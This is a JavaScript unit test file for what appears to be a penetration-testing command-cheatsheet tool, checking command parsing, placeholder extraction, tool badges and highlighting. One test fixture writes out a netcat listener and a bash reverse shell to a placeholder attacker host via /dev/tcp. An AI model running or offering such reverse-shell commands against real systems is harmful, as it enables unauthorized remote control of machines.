import assert from "node:assert/strict";
import { parseCommandsText } from "../js/parse_core.js";
import { extractTags, isCredentialedTemplate } from "../js/template_core.js";
import { toolBadgeFromCmd } from "../js/tooling.js";
import { highlightCommand } from "../js/highlight.js";

function test(name, fn) {
  try {
    fn();
    console.log(`✓ ${name}`);
  } catch (e) {
    console.error(`✗ ${name}`);
    console.error(e);
    process.exitCode = 1;
  }
}

test("parseCommandsText groups identical titles into multi-step card", () => {
  const input = [
    "Reverse shell: nc -lvnp <kaliPort>",
    "Reverse shell: bash -i >& /dev/tcp/<kali>/<kaliPort> 0>&1",
  ].join("\n");
  const out = parseCommandsText(input);
  assert.equal(out.length, 1);
  assert.equal(out[0].title, "Reverse shell");
  assert.match(out[0].cmd, /nc -lvnp/);
  assert.match(out[0].cmd, /bash -i/);
});

test("parseCommandsText moves priority cards first", () => {
  const input = [
    "Normal: echo hi",
    "^Priority: whoami",
    "Normal2: id",
  ].join("\n");
  const out = parseCommandsText(input);
  assert.equal(out[0].title, "Priority");
});

test("extractTags detects placeholders", () => {
  const tags = extractTags("nmap -p <port> <target>");
  assert.deepEqual(tags.sort(), ["<port>", "<target>"].sort());
});

test("isCredentialedTemplate requires both <user> and <password>", () => {
  assert.equal(isCredentialedTemplate("ssh <user>@<target>"), false);
  assert.equal(isCredentialedTemplate("-u <user> -p <password>"), true);
});

test("toolBadgeFromCmd identifies wrappers and detects underlying command", () => {
  assert.equal(toolBadgeFromCmd("sudo nmap -sV <target>"), "nmap");
  assert.equal(toolBadgeFromCmd("env FOO=1 nc -nv <target> <port>"), "nc");
});

test("highlightCommand highlights comments but not numbering like #2", () => {
  const a = highlightCommand("echo hi #target-machine");
  assert.match(a, /class=\"comment\"/);

  const b = highlightCommand("step #2 do thing");
  // should not wrap #2 as comment
  assert.ok(!/class=\"comment\"[^>]*>\s*#2/.test(b));
});

if (process.exitCode) {
  console.log("\nSome tests failed.");
} else {
  console.log("\nAll tests passed.");
}
